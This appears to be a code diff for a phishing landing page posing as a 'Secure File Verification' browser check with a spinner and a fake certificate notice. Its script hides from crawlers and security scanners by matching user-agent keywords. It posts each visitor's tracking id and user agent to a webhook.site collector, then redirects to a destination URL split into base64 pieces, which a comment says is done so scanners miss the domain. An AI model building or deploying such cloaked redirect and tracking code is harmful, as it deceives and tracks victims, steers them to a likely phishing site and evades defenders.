@@ -1,40 +1,63 @@
-<script>
-    (function() {
-        const ua = navigator.userAgent.toLowerCase();
-        const bots = ["bot", "crawler", "spider", "google", "bing", "slurp", "facebook", "vision", "headless", "chrome-lighthouse", "virus", "scanner", "defense", "security"];
-        const isBot = bots.some(bot => ua.includes(bot));
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure File Verification 2026</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f7f9; }
+        .card { background: white; padding: 2.5rem; border-radius: 12px; box-shadow: 0 8px 30px rgba(0,0,0,0.05); text-align: center; max-width: 380px; }
+        .spinner { border: 3px solid #e1e4e8; border-top: 3px solid #0052cc; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { color: #172b4d; font-size: 1.1rem; margin: 0 0 10px; }
+        p { color: #5e6c84; font-size: 0.85rem; line-height: 1.4; }
+    </style>
+</head>
+<body>
+    <div id="content" style="display:none;">
+        <div class="card">
+            <div class="spinner"></div>
+            <h2>Establishing Secure Connection</h2>
+            <p>Session Date: <strong>January 25, 2026</strong></p>
+            <p>Please wait while we verify your browser's security certificates.</p>
+        </div>
+    </div>
 
-        if (!isBot) {
-            document.getElementById('content').style.display = 'block';
+    <script>
+        (function() {
+            const ua = navigator.userAgent.toLowerCase();
+            const bots = ["bot", "crawler", "spider", "google", "bing", "slurp", "facebook", "vision", "headless", "chrome-lighthouse", "virus", "scanner", "defense", "security"];
+            const isBot = bots.some(bot => ua.includes(bot));
 
-            const myPanel = "https://webhook.site/da2082dc-5f8f-418f-9ed4-122a6015ab92";
-            
-            // --- SPLIT LINK TECHNIQUE ---
-            // We break the URL so scanners don't see the full domain
-            const part1 = "aHR0cHM6Ly9zZWF0cmFkZXIuc2Jz"; // seatrader.sbs
-            const part2 = "L2V0aGljYWxlZXhhbW0v";       // /ethicaleexamm/
-            const part3 = "bGFuZGluZw==";               // landing
-            
-            // Rejoin and Decode at runtime
-            const encodedVault = part1 + part2 + part3;
-            const finalDestination = atob(encodedVault);
-            // ----------------------------
+            if (!isBot) {
+                // Now this line will work correctly
+                document.getElementById('content').style.display = 'block';
 
-            const params = new URLSearchParams(window.location.search);
-            const userID = params.get('id') || 'untracked_visitor';
+                const myPanel = "https://webhook.site/da2082dc-5f8f-418f-9ed4-122a6015ab92";
+                
+                const part1 = "aHR0cHM6Ly9zZWF0cmFkZXIuc2Jz"; // seatrader.sbs
+                const part2 = "L2V0aGljYWxlZXhhbW0v";       // /ethicaleexamm/
+                const part3 = "bGFuZGluZw==";               // landing
+                
+                const encodedVault = part1 + part2 + part3;
+                const finalDestination = atob(encodedVault);
 
-            fetch(myPanel, {
-                method: "POST",
-                mode: "no-cors",
-                body: JSON.stringify({ id: userID, agent: ua, time: new Date().toLocaleString() })
-            });
+                const params = new URLSearchParams(window.location.search);
+                const userID = params.get('id') || 'untracked_visitor';
 
-            setTimeout(() => {
-                // Use the joined and decoded link
-                window.location.replace(finalDestination);
-            }, 3000);
-        } else {
-            console.log("Connection Timeout");
-        }
-    })();
-</script>
+                fetch(myPanel, {
+                    method: "POST",
+                    mode: "no-cors",
+                    body: JSON.stringify({ id: userID, agent: ua, time: new Date().toLocaleString() })
+                });
+
+                setTimeout(() => {
+                    window.location.replace(finalDestination);
+                }, 3000);
+            } else {
+                console.log("Connection Timeout");
+            }
+        })();
+    </script>
+</body>
+</html>
